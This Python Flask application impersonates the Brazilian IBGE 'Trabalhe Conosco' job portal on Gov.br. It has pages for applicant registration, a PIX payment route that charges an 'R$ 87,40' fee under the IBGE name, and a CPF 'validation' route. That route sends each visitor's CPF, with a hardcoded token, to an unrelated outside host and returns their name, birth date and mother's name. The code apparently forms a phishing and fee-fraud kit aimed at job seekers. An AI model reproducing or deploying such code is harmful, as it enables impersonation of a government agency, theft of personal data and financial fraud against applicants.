"""
Aplicação Flask ultra-simplificada para Heroku
IBGE Trabalhe Conosco - Portal Gov.br
"""
import os
import logging
import random
from flask import Flask, render_template, request, jsonify

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Criar app Flask
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "heroku-ibge-secret-key-2025")

@app.route('/')
def index():
    """Página inicial"""
    try:
        return render_template('index.html')
    except Exception as e:
        logger.error(f"Erro ao renderizar index.html: {str(e)}")
        # Fallback para HTML simples
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>IBGE Trabalhe Conosco</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script src="https://cdn.tailwindcss.com"></script>
        </head>
        <body class="bg-gray-50">
            <div class="container mx-auto px-4 py-8">
                <h1 class="text-3xl font-bold text-blue-800 mb-6">IBGE - Trabalhe Conosco</h1>
                <div class="bg-white rounded-lg shadow-lg p-6">
                    <h2 class="text-xl font-semibold mb-4">Portal em Manutenção</h2>
                    <p class="text-gray-700 mb-4">O sistema está sendo ajustado. Erro: {str(e)}</p>
                    <a href="/health" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
                        Verificar Status
                    </a>
                </div>
            </div>
        </body>
        </html>
        """

@app.route('/resultados-busca')
def resultados_busca():
    """Resultados de busca"""
    return render_template('resultados_busca.html')

@app.route('/formulario-inscricao')
def formulario_inscricao():
    """Formulário de inscrição"""
    return render_template('formulario_inscricao.html')

@app.route('/comprovante-inscricao')
def comprovante_inscricao():
    """Comprovante de inscrição"""
    return render_template('comprovante_inscricao.html')

@app.route('/pagamento-pix')
def pagamento_pix():
    """Página de pagamento PIX"""
    return render_template('pagamento_pix.html')

@app.route('/agendamento-psicotecnico')
def agendamento_psicotecnico():
    """Agendamento psicotécnico"""
    return render_template('agendamento_psicotecnico.html')

@app.route('/registro-sgte')
def registro_sgte():
    """Registro SGTE"""
    return render_template('registro_sgte.html')

@app.route('/confirmacao-agendamento')
def confirmacao_agendamento():
    """Confirmação de agendamento"""
    return render_template('confirmacao_agendamento.html')

@app.route('/suporte')
def suporte():
    """Página de suporte"""
    return render_template('index.html')

@app.route('/health')
def health():
    """Health check para Heroku"""
    return jsonify({
        'status': 'ok', 
        'message': 'IBGE Trabalhe Conosco funcionando no Heroku',
        'app': 'heroku_app.py'
    })

@app.route('/validar-cpf', methods=['POST'])
def validar_cpf():
    """Validar CPF usando API externa"""
    try:
        import requests
        
        data = request.get_json()
        cpf = data.get('cpf', '').replace('.', '').replace('-', '')
        
        if not cpf or len(cpf) != 11:
            return jsonify({'success': False, 'message': 'CPF inválido'})
        
        # API de validação de CPF
        api_url = f"https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}"
        
        response = requests.get(api_url, timeout=10)
        
        if response.status_code == 200:
            dados = response.json()
            
            if dados.get('situacao') == 'REGULAR':
                return jsonify({
                    'success': True,
                    'dados': {
                        'nome': dados.get('nome', ''),
                        'cpf': cpf,
                        'cpf_formatado': f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}",
                        'data_nascimento': dados.get('data_nascimento', ''),
                        'data_nascimento_formatada': dados.get('data_nascimento_formatada', ''),
                        'nome_mae': dados.get('nome_mae', ''),
                        'sexo': dados.get('sexo', ''),
                        'situacao': dados.get('situacao', '')
                    }
                })
            else:
                return jsonify({'success': False, 'message': 'CPF irregular ou bloqueado'})
        else:
            return jsonify({'success': False, 'message': 'Erro na validação do CPF'})
            
    except Exception as e:
        logger.error(f"Erro na validação CPF: {str(e)}")
        return jsonify({'success': False, 'message': f'Erro interno: {str(e)}'})

@app.route('/api/gerar-pix', methods=['POST'])
def gerar_pix():
    """Gerar pagamento PIX - Mock para Heroku"""
    try:
        data = request.get_json()
        
        # Gerar PIX mock
        transacao_id = random.randint(700000, 799999)
        pix_code = f"00020101021226840014br.gov.bcb.pix2562heroku.pix.gov.br/qr/{transacao_id}5204000053039865802BR5924IBGE TRABALHE CONOSCO6009SAO PAULO62070503***6304{random.randint(1000, 9999)}"
        
        logger.info(f"PIX Heroku gerado - ID: {transacao_id}")
        
        return jsonify({
            'success': True,
            'transacao_id': transacao_id,
            'pix_code': pix_code,
            'qr_code': pix_code,
            'valor': "R$ 87,40",
            'status': 'pending',
            'api_provider': 'Heroku Mock PIX - Demo'
        })
            
    except Exception as e:
        logger.error(f"Erro ao gerar PIX: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Erro interno: {str(e)}'
        })

@app.route('/api/verificar-pagamento/<int:transacao_id>')
def verificar_pagamento(transacao_id):
    """Verificar status do pagamento PIX - Mock para Heroku"""
    try:
        # Simular verificação para Heroku
        status = 'paid' if random.random() > 0.6 else 'pending'
        
        return jsonify({
            'success': True,
            'status': status,
            'paid_at': '2025-08-14T01:45:00Z' if status == 'paid' else None,
            'id': transacao_id
        })
        
    except Exception as e:
        logger.error(f"Erro ao verificar pagamento: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Erro ao verificar pagamento: {str(e)}'
        })

@app.errorhandler(404)
def not_found(error):
    """Página 404"""
    return render_template('index.html'), 404

@app.errorhandler(500)
def internal_error(error):
    """Página 500"""
    logger.error(f"500 - Erro interno: {str(error)}")
    return render_template('index.html'), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)